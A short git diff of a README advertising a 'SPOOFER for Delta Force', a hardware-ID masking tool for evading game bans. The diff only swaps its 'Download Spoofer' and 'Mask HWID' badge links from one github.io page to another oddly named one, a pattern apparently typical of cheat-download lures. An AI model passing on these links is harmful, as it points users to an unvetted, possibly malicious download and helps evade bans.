@@ -1,7 +1,7 @@
 # 🔒 SPOOFER for Delta Force
 
-[![Download Spoofer](https://img.shields.io/badge/Download_Spoofer-darkcyan?style=for-the-badge)](https://delta-force-hwid-spoofer.github.io/.github/)  
-[![Mask HWID](https://img.shields.io/badge/Mask_HWID-slateblue?style=for-the-badge&logo=delta)](https://delta-force-hwid-spoofer.github.io/.github/)
+[![Download Spoofer](https://img.shields.io/badge/Download_Spoofer-darkcyan?style=for-the-badge)](https://deltaforcehwid1weeb0.github.io/.github/)  
+[![Mask HWID](https://img.shields.io/badge/Mask_HWID-slateblue?style=for-the-badge&logo=delta)](https://deltaforcehwid1weeb0.github.io/.github/)
 
 ---
 
